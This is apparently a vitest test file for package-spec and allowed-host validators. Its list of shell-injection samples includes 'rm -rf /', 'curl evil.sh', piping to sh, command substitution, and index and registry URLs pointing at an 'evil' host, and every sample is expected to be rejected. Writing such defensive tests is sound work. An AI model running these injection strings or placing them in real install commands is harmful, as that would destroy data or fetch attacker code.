import { describe, expect, it } from 'vitest';

import {
	isValidAllowedHost,
	isValidNpmPackageSpec,
	isValidPipPackageSpec,
	normalizeRuntimePackageList
} from '../runtime-environment.js';

/**
 * Environments — table tests for the package-spec / host allow-lists.
 * These values later reach install commands and provider API payloads,
 * so every shell metacharacter must be rejected (defense in depth).
 */
const SHELL_INJECTION_SAMPLES = [
	'requests; rm -rf /',
	'requests && curl evil.sh',
	'requests | sh',
	'requests$(whoami)',
	'requests`id`',
	"requests' --extra-index-url http://evil",
	'requests"',
	'requests\npandas',
	'requests pandas',
	'requests>out.txt',
	'--upgrade',
	'-e.',
	'{a,b}'
];

describe('isValidPipPackageSpec', () => {
	const valid = [
		'requests',
		'pandas==2.2.0',
		'uvicorn[standard]',
		'uvicorn[standard]>=0.29,<1',
		'scikit-learn~=1.4',
		'a',
		'my_pkg.plugin',
		'foo!=1.0.*'
	];
	it.each(valid)('accepts %s', (spec) => {
		expect(isValidPipPackageSpec(spec)).toBe(true);
	});

	const invalid = ['', '.hidden', '-flag', 'name==', 'a'.repeat(129), ...SHELL_INJECTION_SAMPLES];
	it.each(invalid)('rejects %j', (spec) => {
		expect(isValidPipPackageSpec(spec)).toBe(false);
	});
});

describe('isValidNpmPackageSpec', () => {
	const valid = [
		'typescript',
		'left-pad@1.3.0',
		'eslint@^9.1.0',
		'@types/node@^22',
		'@scope/pkg',
		'pkg@latest',
		'pkg@>=1.2.x'
	];
	it.each(valid)('accepts %s', (spec) => {
		expect(isValidNpmPackageSpec(spec)).toBe(true);
	});

	const invalid = [
		'',
		'@',
		'@/pkg',
		'@scope/',
		'-flag',
		'pkg@1.0.0 --registry=http://evil',
		'a'.repeat(129),
		...SHELL_INJECTION_SAMPLES
	];
	it.each(invalid)('rejects %j', (spec) => {
		expect(isValidNpmPackageSpec(spec)).toBe(false);
	});
});

describe('isValidAllowedHost', () => {
	const valid = ['api.anthropic.com', 'registry.npmjs.org', '*.example.com', 'localhost', 'a-b.c'];
	it.each(valid)('accepts %s', (host) => {
		expect(isValidAllowedHost(host)).toBe(true);
	});

	const invalid = [
		'',
		'https://example.com',
		'example.com/path',
		'example.com:443',
		'*.*.example.com',
		'-leading.example.com',
		'exa mple.com',
		'evil.com;rm'
	];
	it.each(invalid)('rejects %j', (host) => {
		expect(isValidAllowedHost(host)).toBe(false);
	});
});

describe('normalizeRuntimePackageList', () => {
	it('trims, drops empties, dedupes, and splits valid vs invalid', () => {
		const result = normalizeRuntimePackageList(
			['  requests ', '', 'requests', 'pandas==2.2.0', 'bad;spec', '   '],
			'pip'
		);
		expect(result.valid).toEqual(['requests', 'pandas==2.2.0']);
		expect(result.invalid).toEqual(['bad;spec']);
	});

	it('handles null/undefined input as empty', () => {
		expect(normalizeRuntimePackageList(null, 'npm')).toEqual({ valid: [], invalid: [] });
		expect(normalizeRuntimePackageList(undefined, 'pip')).toEqual({ valid: [], invalid: [] });
	});

	it('applies the npm validator for npm lists', () => {
		const result = normalizeRuntimePackageList(['@types/node@^22', 'no spaces allowed'], 'npm');
		expect(result.valid).toEqual(['@types/node@^22']);
		expect(result.invalid).toEqual(['no spaces allowed']);
	});
});
